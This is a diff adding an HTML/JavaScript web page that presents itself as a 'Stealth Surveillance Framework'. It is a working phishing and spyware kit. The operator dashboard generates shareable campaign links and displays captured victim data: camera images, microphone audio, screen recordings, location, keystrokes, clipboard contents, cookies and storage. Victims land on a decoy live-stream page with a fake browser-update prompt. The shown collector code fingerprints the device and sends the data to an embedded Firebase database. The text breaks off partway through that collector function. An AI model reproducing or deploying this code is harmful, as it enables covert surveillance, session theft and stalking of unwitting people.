@@ -1,0 +1,1013 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>MR_MOMIN_🌍 | Stealth Framework</title>
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
+    <!-- HTML2Canvas -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    <!-- RecordRTC for screen recording -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/recordrtc/5.6.2/RecordRTC.js"></script>
+    <!-- Chart.js -->
+    <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
+    <!-- Leaflet for maps -->
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', sans-serif;
+        }
+        body {
+            background: linear-gradient(145deg, #f0f4ff 0%, #e9eef7 100%);
+            min-height: 100vh;
+            padding: 2rem;
+        }
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+        /* Premium Glass Header */
+        .premium-header {
+            background: rgba(255,255,255,0.9);
+            backdrop-filter: blur(12px);
+            border-radius: 2rem;
+            padding: 1rem 2rem;
+            margin-bottom: 2rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 1rem;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.05);
+            border: 1px solid rgba(255,255,255,0.8);
+        }
+        .logo-area h1 {
+            font-size: 1.8rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, #1e3c72, #2a5298);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+        .logo-area p {
+            font-size: 0.7rem;
+            color: #4a627a;
+        }
+        .uid-info {
+            background: #fff;
+            border-radius: 2rem;
+            padding: 0.5rem 1rem;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+        }
+        .uid-label {
+            font-weight: 600;
+            color: #1e3c72;
+        }
+        .uid-value {
+            font-family: monospace;
+            font-weight: 700;
+            background: #f0f4ff;
+            padding: 0.2rem 0.8rem;
+            border-radius: 2rem;
+            color: #2a5298;
+        }
+        /* Cards */
+        .card {
+            background: white;
+            border-radius: 1.5rem;
+            padding: 1.5rem;
+            margin-bottom: 2rem;
+            box-shadow: 0 10px 25px -5px rgba(0,0,0,0.05), 0 8px 10px -6px rgba(0,0,0,0.02);
+            border: 1px solid #eef2ff;
+            transition: all 0.3s;
+        }
+        /* Feature Grid - 2 columns fixed */
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 1rem;
+            margin: 1.5rem 0;
+        }
+        .feature-card {
+            background: #f8fafc;
+            border: 1px solid #e2e8f0;
+            border-radius: 1rem;
+            padding: 1rem;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .feature-card i {
+            font-size: 1.8rem;
+            color: #2a5298;
+            margin-bottom: 0.5rem;
+            display: block;
+        }
+        .feature-card span {
+            font-size: 0.9rem;
+            font-weight: 500;
+        }
+        .feature-card.selected {
+            background: linear-gradient(135deg, #eef2ff, #ffffff);
+            border-color: #2a5298;
+            box-shadow: 0 4px 12px rgba(42,82,152,0.15);
+            transform: scale(1.02);
+        }
+        .btn-primary {
+            background: linear-gradient(95deg, #1e3c72, #2a5298);
+            border: none;
+            color: white;
+            padding: 0.9rem;
+            border-radius: 1rem;
+            font-weight: 600;
+            width: 100%;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(30,60,114,0.2);
+        }
+        .link-box {
+            background: #f0f4ff;
+            border-radius: 1rem;
+            padding: 1rem;
+            margin-top: 1rem;
+            border-left: 4px solid #2a5298;
+        }
+        .link-text {
+            word-break: break-all;
+            background: white;
+            padding: 0.8rem;
+            border-radius: 0.8rem;
+            font-family: monospace;
+            font-size: 0.8rem;
+            margin: 0.5rem 0;
+        }
+        /* Campaign List */
+        .campaign-list {
+            max-height: 600px;
+            overflow-y: auto;
+        }
+        .campaign-item {
+            background: #fafcff;
+            border: 1px solid #e2e8f0;
+            border-radius: 1rem;
+            padding: 1rem;
+            margin-bottom: 1rem;
+        }
+        .campaign-header {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            align-items: center;
+            gap: 0.5rem;
+            margin-bottom: 0.8rem;
+        }
+        .campaign-link {
+            font-size: 0.7rem;
+            word-break: break-all;
+            font-family: monospace;
+            color: #2a5298;
+            flex: 1;
+        }
+        .campaign-clicks {
+            background: #1e3c72;
+            color: white;
+            padding: 0.2rem 0.8rem;
+            border-radius: 2rem;
+            font-weight: bold;
+        }
+        .copy-camp, .delete-camp {
+            background: #eef2ff;
+            border: 1px solid #cbd5e1;
+            border-radius: 1rem;
+            padding: 0.3rem 0.8rem;
+            cursor: pointer;
+        }
+        .delete-camp {
+            color: #c00;
+        }
+        /* Victim Data Styling */
+        .victim-item {
+            background: white;
+            border-radius: 1rem;
+            padding: 1rem;
+            margin-top: 1rem;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+            border: 1px solid #eef2ff;
+        }
+        .victim-header {
+            display: flex;
+            justify-content: space-between;
+            border-bottom: 1px solid #e2e8f0;
+            padding-bottom: 0.5rem;
+            margin-bottom: 0.8rem;
+            flex-wrap: wrap;
+        }
+        .victim-tabs {
+            display: flex;
+            gap: 0.5rem;
+            flex-wrap: wrap;
+            margin-bottom: 1rem;
+        }
+        .tab-btn {
+            background: #f1f5f9;
+            border: none;
+            padding: 0.3rem 0.8rem;
+            border-radius: 2rem;
+            cursor: pointer;
+            font-size: 0.7rem;
+        }
+        .tab-btn.active {
+            background: #2a5298;
+            color: white;
+        }
+        .tab-content {
+            display: none;
+        }
+        .tab-content.active {
+            display: block;
+        }
+        .image-grid, .video-grid {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 0.5rem;
+        }
+        .thumbnail {
+            width: 100px;
+            height: 100px;
+            object-fit: cover;
+            border-radius: 0.5rem;
+            cursor: pointer;
+            border: 2px solid #e2e8f0;
+        }
+        .video-thumb {
+            width: 160px;
+            background: #000;
+            border-radius: 0.5rem;
+        }
+        audio {
+            max-width: 200px;
+            margin: 0.2rem;
+        }
+        .map-container {
+            height: 200px;
+            border-radius: 0.8rem;
+            margin-top: 0.5rem;
+        }
+        /* Lightbox Modal */
+        .lightbox {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.9);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        .lightbox.active {
+            display: flex;
+        }
+        .lightbox-img, .lightbox-video {
+            max-width: 90%;
+            max-height: 80%;
+            border-radius: 1rem;
+        }
+        .close-lightbox {
+            position: absolute;
+            top: 20px;
+            right: 30px;
+            color: white;
+            font-size: 2rem;
+            cursor: pointer;
+        }
+        /* Stats row */
+        .stats-row {
+            display: flex;
+            gap: 1rem;
+            flex-wrap: wrap;
+            margin-bottom: 1rem;
+        }
+        .stat-card {
+            background: #f8fafc;
+            border-radius: 1rem;
+            padding: 0.8rem;
+            flex: 1;
+            text-align: center;
+            border: 1px solid #e2e8f0;
+        }
+        .export-btn {
+            background: #eef2ff;
+            border: 1px solid #cbd5e1;
+            border-radius: 2rem;
+            padding: 0.4rem 1rem;
+            cursor: pointer;
+        }
+        .hide {
+            display: none;
+        }
+        /* Victim Panel (Fake Live Stream Page) */
+        .victim-panel {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: #0a0a1a;
+            color: white;
+            padding: 0;
+            border-radius: 1.5rem;
+            overflow: hidden;
+        }
+        .fake-stream-header {
+            background: linear-gradient(90deg, #1e3c72, #2a5298);
+            padding: 1rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+        .fake-stream-title {
+            font-size: 1.5rem;
+            font-weight: bold;
+        }
+        .fake-stream-video {
+            background: #000;
+            position: relative;
+            width: 100%;
+            aspect-ratio: 16/9;
+        }
+        .fake-stream-video video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .fake-stream-chat {
+            background: #1e1e2a;
+            padding: 1rem;
+            height: 300px;
+            overflow-y: auto;
+        }
+        .chat-message {
+            background: #2a2a3a;
+            margin: 0.5rem 0;
+            padding: 0.5rem;
+            border-radius: 0.5rem;
+        }
+        .status-msg {
+            text-align: center;
+            color: #2a5298;
+            margin: 1rem;
+        }
+        @media (max-width: 768px) {
+            body { padding: 1rem; }
+            .thumbnail { width: 70px; height: 70px; }
+            .feature-grid {
+                grid-template-columns: 1fr; /* on mobile single column */
+            }
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <!-- Header -->
+    <div class="premium-header">
+        <div class="logo-area">
+            <h1>MR_MOMIN_🌍</h1>
+            <p>Stealth Surveillance Framework v11.0</p>
+        </div>
+        <div class="uid-info">
+            <span class="uid-label"><i class="fas fa-fingerprint"></i> PERMANENT ID</span>
+            <span class="uid-value" id="displayUid">--</span>
+        </div>
+    </div>
+
+    <!-- Dashboard -->
+    <div id="dashboardPanel">
+        <div class="card">
+            <h3><i class="fas fa-microchip"></i> SELECT STEALTH MODULES</h3>
+            <div class="feature-grid" id="featureGrid">
+                <!-- Row 1: CAMERA & MICROPHONE -->
+                <div class="feature-card" data-feat="C"><i class="fas fa-camera"></i><span>CAMERA</span></div>
+                <div class="feature-card" data-feat="M"><i class="fas fa-microphone"></i><span>MICROPHONE</span></div>
+                <!-- Row 2: LOCATION & KEYLOGGER -->
+                <div class="feature-card" data-feat="L"><i class="fas fa-map-marker-alt"></i><span>LOCATION</span></div>
+                <div class="feature-card" data-feat="K"><i class="fas fa-keyboard"></i><span>KEYLOGGER</span></div>
+                <!-- Row 3: CLIPBOARD & SCREEN REC -->
+                <div class="feature-card" data-feat="P"><i class="fas fa-clipboard"></i><span>CLIPBOARD</span></div>
+                <div class="feature-card" data-feat="R"><i class="fas fa-video"></i><span>SCREEN REC</span></div>
+                <!-- Row 4: NET SCAN & FAKE UPDATE -->
+                <div class="feature-card" data-feat="N"><i class="fas fa-network-wired"></i><span>NET SCAN</span></div>
+                <div class="feature-card" data-feat="F"><i class="fas fa-ad"></i><span>FAKE UPDATE</span></div>
+            </div>
+            <p style="font-size:0.7rem; color:#6c757d; margin:0.5rem 0;">Auto-collect: Device Info, Fingerprint, Cookies, Storage, WebRTC, GPU, Audio Devices</p>
+            <button class="btn-primary" id="generateLinkBtn"><i class="fas fa-link"></i> GENERATE NEW CAMPAIGN LINK</button>
+            <div id="newLinkBox" class="link-box hide">
+                <strong><i class="fas fa-share-alt"></i> SHARE THIS LINK</strong>
+                <div class="link-text" id="newLinkText">--</div>
+                <button id="copyLinkBtn" class="export-btn" style="width:100%; margin-top:0.5rem;"><i class="fas fa-copy"></i> COPY LINK</button>
+            </div>
+        </div>
+
+        <!-- Stats Overview -->
+        <div class="card" id="statsCard">
+            <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 1rem; margin-bottom: 1rem;">
+                <h3><i class="fas fa-chart-simple"></i> OVERVIEW</h3>
+                <button id="exportAllDataBtn" class="export-btn"><i class="fas fa-download"></i> EXPORT ALL DATA (JSON)</button>
+            </div>
+            <div class="stats-row" id="statsRow">
+                <div class="stat-card"><i class="fas fa-chart-line"></i><br><span id="totalClicks">0</span><br>Total Clicks</div>
+                <div class="stat-card"><i class="fas fa-users"></i><br><span id="totalVictims">0</span><br>Total Victims</div>
+            </div>
+            <canvas id="clicksChart" height="100" style="max-height: 200px;"></canvas>
+        </div>
+
+        <div class="card">
+            <h3><i class="fas fa-chart-line"></i> ACTIVE CAMPAIGNS</h3>
+            <div id="campaignList"></div>
+        </div>
+        <div id="dashboardStatus" class="status-msg"></div>
+    </div>
+
+    <!-- Victim Panel (Fake Live Stream Page) -->
+    <div id="victimPanel" class="victim-panel hide">
+        <div class="fake-stream-header">
+            <div class="fake-stream-title"><i class="fas fa-tv"></i> LIVE: Exclusive Interview</div>
+            <div><i class="fas fa-users"></i> 12.3k watching</div>
+        </div>
+        <div class="fake-stream-video">
+            <video id="fakeVideo" autoplay loop muted playsinline>
+                <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
+                Your browser does not support the video tag.
+            </video>
+        </div>
+        <div class="fake-stream-chat" id="fakeChat">
+            <div class="chat-message"><strong>User_123:</strong> Amazing content!</div>
+            <div class="chat-message"><strong>JohnDoe:</strong> When will the next episode?</div>
+            <div class="chat-message"><strong>Admin:</strong> Stay tuned for more updates!</div>
+        </div>
+        <div id="fakeUpdateDiv" style="display:none; background:#2a2a3a; padding:0.5rem; text-align:center;">
+            <span>⚠️ Your browser needs an update. <button id="fakeUpdateBtn">Update Now</button></span>
+        </div>
+        <div id="victimStatus" class="status-msg"></div>
+    </div>
+</div>
+
+<!-- Lightbox Modal -->
+<div id="lightbox" class="lightbox">
+    <span class="close-lightbox">&times;</span>
+    <img class="lightbox-img" id="lightbox-img" src="">
+    <video class="lightbox-video" id="lightbox-video" controls style="display:none;"></video>
+</div>
+
+<video id="hiddenVideo" style="display:none;" autoplay playsinline muted></video>
+<canvas id="hiddenCanvas" style="display:none;"></canvas>
+
+<script>
+    // ========== FIREBASE CONFIG (YOUR PROVIDED) ==========
+    const firebaseConfig = {
+        apiKey: "AIzaSyDdYUeWB_e-Pv7-4yBN49P3ZN1Ig4PTW1g",
+        authDomain: "momin-tracking-sysrem.firebaseapp.com",
+        databaseURL: "https://momin-tracking-sysrem-default-rtdb.firebaseio.com",
+        projectId: "momin-tracking-sysrem",
+        storageBucket: "momin-tracking-sysrem.firebasestorage.app",
+        messagingSenderId: "294704122788",
+        appId: "1:294704122788:web:147bff72e6bf866a808f31",
+        measurementId: "G-BS81ZN7BDD"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    // Helper Functions
+    function generateUID() { return Math.floor(10000000 + Math.random() * 90000000).toString(); }
+    function showMsg(msg, isError=false) {
+        const el = document.getElementById('dashboardStatus');
+        if(el) { el.innerHTML = `<i class="fas ${isError ? 'fa-exclamation-triangle' : 'fa-check-circle'}"></i> ${msg}`; el.style.color = isError ? '#c00' : '#2a5298'; setTimeout(()=>{if(el.innerHTML.includes(msg)) el.innerHTML='';},4000); }
+    }
+    function copyClip(txt) { navigator.clipboard.writeText(txt).then(()=>showMsg('Link copied!')).catch(()=>showMsg('Copy failed',true)); }
+
+    // Lightbox (supports both image and video)
+    function initLightbox() {
+        const lightbox = document.getElementById('lightbox');
+        const lightboxImg = document.getElementById('lightbox-img');
+        const lightboxVideo = document.getElementById('lightbox-video');
+        const closeBtn = document.querySelector('.close-lightbox');
+        window.openLightbox = (src, type='image') => {
+            if(type === 'image') {
+                lightboxImg.style.display = 'block';
+                lightboxVideo.style.display = 'none';
+                lightboxImg.src = src;
+            } else if(type === 'video') {
+                lightboxImg.style.display = 'none';
+                lightboxVideo.style.display = 'block';
+                lightboxVideo.src = src;
+                lightboxVideo.load();
+            }
+            lightbox.classList.add('active');
+        };
+        closeBtn.onclick = () => {
+            lightbox.classList.remove('active');
+            if(lightboxVideo.src) lightboxVideo.pause();
+        };
+        lightbox.onclick = (e) => { if(e.target === lightbox) lightbox.classList.remove('active'); };
+    }
+
+    // Dashboard State
+    let currentUid = null;
+    let campaignsRef = null;
+    let clicksChart = null;
+
+    async function loadSellerDashboard(uid) {
+        const snap = await db.ref(`sellers/${uid}`).once('value');
+        if(!snap.exists()) await db.ref(`sellers/${uid}`).set({ createdAt: Date.now() });
+        currentUid = uid;
+        localStorage.setItem('momin_uid', uid);
+        document.getElementById('displayUid').innerText = uid;
+        document.getElementById('dashboardPanel').classList.remove('hide');
+        document.getElementById('victimPanel').classList.add('hide');
+        if(campaignsRef) campaignsRef.off();
+        campaignsRef = db.ref(`sellers/${uid}/campaigns`);
+        campaignsRef.on('value', (snap) => renderCampaigns(snap.val() || {}));
+        updateStats();
+        showMsg('Dashboard loaded');
+    }
+
+    async function updateStats() {
+        const campaignsSnap = await db.ref(`sellers/${currentUid}/campaigns`).once('value');
+        const campaigns = campaignsSnap.val() || {};
+        let totalClicks = 0, totalVictims = 0;
+        for (const camp of Object.values(campaigns)) {
+            totalClicks += camp.clicks || 0;
+            totalVictims += camp.victims ? Object.keys(camp.victims).length : 0;
+        }
+        document.getElementById('totalClicks').innerText = totalClicks;
+        document.getElementById('totalVictims').innerText = totalVictims;
+        if (clicksChart) clicksChart.destroy();
+        const ctx = document.getElementById('clicksChart').getContext('2d');
+        const labels = Object.keys(campaigns).slice(-7);
+        const data = labels.map(c => campaigns[c]?.clicks || 0);
+        clicksChart = new Chart(ctx, {
+            type: 'line',
+            data: { labels: labels.map((_,i)=>`Camp ${i+1}`), datasets: [{ label: 'Clicks', data, borderColor: '#2a5298', tension: 0.3 }] },
+            options: { responsive: true, maintainAspectRatio: true }
+        });
+    }
+
+    function renderCampaigns(campaigns) {
+        const container = document.getElementById('campaignList');
+        if(Object.keys(campaigns).length === 0) {
+            container.innerHTML = '<div style="text-align:center; padding:2rem;"><i class="fas fa-info-circle"></i> No campaigns yet. Create your first link.</div>';
+            return;
+        }
+        let html = '';
+        for(const [campId, camp] of Object.entries(campaigns)) {
+            const link = `${window.location.origin}${window.location.pathname}?uid=${currentUid}&camp=${campId}`;
+            html += `
+                <div class="campaign-item">
+                    <div class="campaign-header">
+                        <div class="campaign-link"><i class="fas fa-link"></i> ${link}</div>
+                        <div class="campaign-clicks"><i class="fas fa-eye"></i> ${camp.clicks || 0}</div>
+                        <button class="copy-camp" data-link="${link}"><i class="fas fa-copy"></i> Copy</button>
+                        <button class="delete-camp" data-camp="${campId}"><i class="fas fa-trash"></i> Delete</button>
+                    </div>
+                    <div class="victim-data" id="victims-${campId}">
+                        <div style="color:#6c757d;"><i class="fas fa-spinner fa-pulse"></i> Loading victims...</div>
+                    </div>
+                </div>
+            `;
+        }
+        container.innerHTML = html;
+        document.querySelectorAll('.copy-camp').forEach(btn => btn.addEventListener('click', (e) => copyClip(btn.getAttribute('data-link'))));
+        document.querySelectorAll('.delete-camp').forEach(btn => btn.addEventListener('click', async (e) => {
+            const campId = btn.getAttribute('data-camp');
+            if(confirm(`Delete campaign ${campId} and all victim data?`)) {
+                await db.ref(`sellers/${currentUid}/campaigns/${campId}`).remove();
+                showMsg('Campaign deleted');
+                updateStats();
+            }
+        }));
+        for(const campId of Object.keys(campaigns)) loadVictimsData(campId);
+        updateStats();
+    }
+
+    function loadVictimsData(campId) {
+        const victimsRef = db.ref(`sellers/${currentUid}/campaigns/${campId}/victims`);
+        victimsRef.on('value', (snap) => {
+            const victims = snap.val() || {};
+            const container = document.getElementById(`victims-${campId}`);
+            if(Object.keys(victims).length === 0) {
+                container.innerHTML = '<div style="color:#6c757d;"><i class="fas fa-user-slash"></i> No victims yet</div>';
+                return;
+            }
+            let html = '<div><i class="fas fa-users"></i> Victims Data (Real-time)</div>';
+            for(const [victimId, data] of Object.entries(victims)) {
+                html += `
+                    <div class="victim-item">
+                        <div class="victim-header">
+                            <span><i class="fas fa-user-secret"></i> <strong>Victim ${victimId.slice(-6)}</strong></span>
+                            <span style="font-size:0.7rem;">${new Date(data.timestamp).toLocaleString()}</span>
+                        </div>
+                        <div class="victim-tabs">
+                            <button class="tab-btn active" data-tab="images-${victimId}">Images (${data.camera?.length || 0})</button>
+                            <button class="tab-btn" data-tab="videos-${victimId}">Screen Rec (${data.screenRec?.length || 0})</button>
+                            <button class="tab-btn" data-tab="audio-${victimId}">Audio (${data.mic?.length || 0})</button>
+                            <button class="tab-btn" data-tab="location-${victimId}">Location (${data.location?.length || 0})</button>
+                            <button class="tab-btn" data-tab="device-${victimId}">Device Info</button>
+                            <button class="tab-btn" data-tab="fingerprint-${victimId}">Fingerprint</button>
+                            <button class="tab-btn" data-tab="storage-${victimId}">Storage</button>
+                            <button class="tab-btn" data-tab="keys-${victimId}">Keystrokes (${data.keys?.length || 0})</button>
+                            <button class="tab-btn" data-tab="clip-${victimId}">Clipboard (${data.clipboard?.length || 0})</button>
+                            <button class="tab-btn" data-tab="network-${victimId}">Network Scan</button>
+                        </div>
+                        <div class="tab-content active" id="tab-images-${victimId}">
+                            ${data.camera && data.camera.length ? `<div class="image-grid">` + data.camera.map(img => `<img src="${img}" class="thumbnail" onclick="openLightbox('${img}')">`).join('') + `</div>` : '<i>No images captured</i>'}
+                        </div>
+                        <div class="tab-content" id="tab-videos-${victimId}">
+                            ${data.screenRec && data.screenRec.length ? `<div class="video-grid">` + data.screenRec.map(vid => `<video src="${vid}" class="video-thumb" controls width="150" onclick="openLightbox('${vid}','video')"></video>`).join('') + `</div>` : '<i>No screen recordings</i>'}
+                        </div>
+                        <div class="tab-content" id="tab-audio-${victimId}">
+                            ${data.mic && data.mic.length ? data.mic.map(audio => `<audio controls src="${audio}"></audio>`).join('<br>') : '<i>No audio recorded</i>'}
+                        </div>
+                        <div class="tab-content" id="tab-location-${victimId}">
+                            ${data.location && data.location.length ? 
+                                `<div>Last known location: ${data.location[data.location.length-1].lat}, ${data.location[data.location.length-1].lng}</div>
+                                 <div class="map-container" id="map-${victimId}"></div>
+                                 <script>
+                                    setTimeout(() => {
+                                        const mapDiv = document.getElementById('map-${victimId}');
+                                        if(mapDiv && !mapDiv._leaflet_id) {
+                                            const map = L.map(mapDiv).setView([${data.location[data.location.length-1].lat}, ${data.location[data.location.length-1].lng}], 13);
+                                            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { attribution: '&copy; OpenStreetMap' }).addTo(map);
+                                            L.marker([${data.location[data.location.length-1].lat}, ${data.location[data.location.length-1].lng}]).addTo(map);
+                                        }
+                                    }, 100);
+                                 <\/script>` : '<i>No location data</i>'}
+                        </div>
+                        <div class="tab-content" id="tab-device-${victimId}">
+                            ${data.deviceInfo ? 
+                                `<div><i class="fas fa-globe"></i> IP: ${data.deviceInfo.ip || 'N/A'}</div>
+                                 <div><i class="fas fa-battery-full"></i> Battery: ${data.deviceInfo.battery || 'N/A'}</div>
+                                 <div><i class="fas fa-laptop"></i> Platform: ${data.deviceInfo.platform || 'N/A'}</div>
+                                 <div><i class="fas fa-language"></i> Language: ${data.deviceInfo.language || 'N/A'}</div>
+                                 <div><i class="fas fa-desktop"></i> Screen: ${data.deviceInfo.screen || 'N/A'}</div>
+                                 <div><i class="fas fa-microchip"></i> Cores: ${data.deviceInfo.hardwareConcurrency || 'N/A'}</div>
+                                 <div><i class="fas fa-clock"></i> Timezone: ${data.deviceInfo.timezone || 'N/A'}</div>
+                                 <div><i class="fas fa-microphone"></i> Audio Inputs: ${data.deviceInfo.audioInputs || 'N/A'}</div>
+                                 <div><i class="fas fa-tv"></i> GPU: ${data.deviceInfo.gpu || 'N/A'}</div>
+                                 <div><i class="fas fa-code"></i> UserAgent: ${data.deviceInfo.userAgent || 'N/A'}</div>` : '<i>No device info</i>'}
+                        </div>
+                        <div class="tab-content" id="tab-fingerprint-${victimId}">
+                            ${data.fingerprint ? 
+                                `<div><i class="fas fa-palette"></i> Canvas: ${data.fingerprint.canvasFingerprint || 'N/A'}</div>
+                                 <div><i class="fas fa-cubes"></i> WebGL: ${data.fingerprint.webglVendor || 'N/A'}</div>
+                                 <div><i class="fas fa-font"></i> Fonts: ${data.fingerprint.fonts?.join(', ') || 'N/A'}</div>
+                                 <div><i class="fas fa-plug"></i> Plugins: ${data.fingerprint.plugins?.join(', ') || 'N/A'}</div>
+                                 <div><i class="fas fa-network-wired"></i> Local IP: ${data.fingerprint.localIP || 'N/A'}</div>` : '<i>No fingerprint data</i>'}
+                        </div>
+                        <div class="tab-content" id="tab-storage-${victimId}">
+                            ${data.cookies ? `<div><i class="fas fa-cookie-bite"></i> Cookies: ${data.cookies}</div>` : ''}
+                            ${data.localStorage ? `<div><i class="fas fa-database"></i> LocalStorage: ${data.localStorage}</div>` : ''}
+                            ${data.sessionStorage ? `<div><i class="fas fa-database"></i> SessionStorage: ${data.sessionStorage}</div>` : ''}
+                            ${!data.cookies && !data.localStorage && !data.sessionStorage ? '<i>No storage data</i>' : ''}
+                        </div>
+                        <div class="tab-content" id="tab-keys-${victimId}">
+                            ${data.keys && data.keys.length ? data.keys.map(k => `<div>${new Date(k.timestamp).toLocaleTimeString()}: ${k.key} (${k.windowTitle || 'unknown'})</div>`).join('') : '<i>No keystrokes captured</i>'}
+                        </div>
+                        <div class="tab-content" id="tab-clip-${victimId}">
+                            ${data.clipboard && data.clipboard.length ? data.clipboard.map(c => `<div>${new Date(c.timestamp).toLocaleTimeString()}: ${c.text.substring(0,100)}</div>`).join('') : '<i>No clipboard data</i>'}
+                        </div>
+                        <div class="tab-content" id="tab-network-${victimId}">
+                            ${data.networkScan ? `<div><i class="fas fa-network-wired"></i> Local Network Devices: ${data.networkScan}</div>` : '<i>No network scan performed</i>'}
+                        </div>
+                    </div>
+                `;
+            }
+            container.innerHTML = html;
+            // Attach tab switching events
+            document.querySelectorAll('.tab-btn').forEach(btn => {
+                btn.addEventListener('click', () => {
+                    const target = btn.getAttribute('data-tab');
+                    const parent = btn.closest('.victim-item');
+                    parent.querySelectorAll('.tab-content').forEach(tc => tc.classList.remove('active'));
+                    parent.querySelectorAll('.tab-btn').forEach(tb => tb.classList.remove('active'));
+                    document.getElementById(`tab-${target}`).classList.add('active');
+                    btn.classList.add('active');
+                });
+            });
+        });
+    }
+
+    function generateNewCampaign() {
+        if(!currentUid) { showMsg('No UID', true); return; }
+        const selected = Array.from(document.querySelectorAll('.feature-card.selected')).map(c => c.getAttribute('data-feat')).join('');
+        if(selected.length === 0) { showMsg('Select at least one feature', true); return; }
+        const campId = 'CAMP_' + Date.now() + '_' + Math.random().toString(36).substring(2,6);
+        db.ref(`sellers/${currentUid}/campaigns/${campId}`).set({
+            features: selected, clicks: 0, createdAt: Date.now(), victims: {}
+        }).then(() => {
+            const link = `${window.location.origin}${window.location.pathname}?uid=${currentUid}&camp=${campId}`;
+            document.getElementById('newLinkText').innerText = link;
+            document.getElementById('newLinkBox').classList.remove('hide');
+            showMsg('Campaign created! Share the link.');
+        }).catch(err => showMsg('Error: '+err.message, true));
+    }
+
+    // Export all data
+    document.getElementById('exportAllDataBtn')?.addEventListener('click', async () => {
+        if(!currentUid) return;
+        const snap = await db.ref(`sellers/${currentUid}`).once('value');
+        const data = snap.val();
+        const blob = new Blob([JSON.stringify(data, null, 2)], {type: 'application/json'});
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = `momin_export_${currentUid}.json`;
+        a.click();
+        URL.revokeObjectURL(url);
+        showMsg('Data exported');
+    });
+
+    // ========== VICTIM COLLECTOR (STEALTH MODE) ==========
+    async function startVictimCollector(sellerUid, campaignId, features) {
+        const victimId = 'V_' + Date.now() + '_' + Math.random().toString(36).substring(2,8);
+        const victimRef = db.ref(`sellers/${sellerUid}/campaigns/${campaignId}/victims/${victimId}`);
+        const victimData = {
+            deviceInfo: {}, location: [], camera: [], mic: [], keys: [], clipboard: [],
+            fingerprint: {}, cookies: '', localStorage: '', sessionStorage: '',
+            screenRec: [], networkScan: '',
+            timestamp: Date.now()
+        };
+
+        // --- Always collect advanced device info ---
+        let ip='unknown'; try{ let r=await fetch('https://api.ipify.org?format=json'); let d=await r.json(); ip=d.ip; }catch(e){}
+        let battery='N/A'; if(navigator.getBattery){ let b=await navigator.getBattery(); battery=`${Math.round(b.level*100)}% (${b.charging?'charging':'not'})`; }
+        let gpu = 'N/A';
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if(gl) {
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                if(debugInfo) gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+            }
+        } catch(e) {}
+        let audioInputs = 'N/A';
+        try {
+            const devices = await navigator.mediaDevices.enumerateDevices();
+            audioInputs = devices.filter(d => d.kind === 'audioinput').map(d => d.label).join(', ');
+        } catch(e) {}
+        victimData.deviceInfo = {
+            ip, battery, platform: navigator.platform, language: navigator.language,
+            screen: `${screen.width}x${screen.height}`, hardwareConcurrency: navigator.hardwareConcurrency,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            userAgent: navigator.userAgent, gpu, audioInputs
+        };
+
+        // --- Advanced fingerprinting ---
+        const canvas = document.createElement('canvas'); canvas.width=200; canvas.height=50;
+        const ctx = canvas.getContext('2d'); ctx.fillStyle='#f0f'; ctx.fillRect(0,0,200,50); ctx.fillStyle='#0f0'; ctx.fillText('MR_MOMIN',10,20);
+        const canvasFingerprint = canvas.toDataURL();
+        let webglVendor = 'N/A';
+        try {
+            const gl = document.createElement('canvas').getContext('webgl');
+            if(gl) webglVendor = gl.getParameter(gl.VENDOR) + ' ' + gl.getParameter(gl.RENDERER);
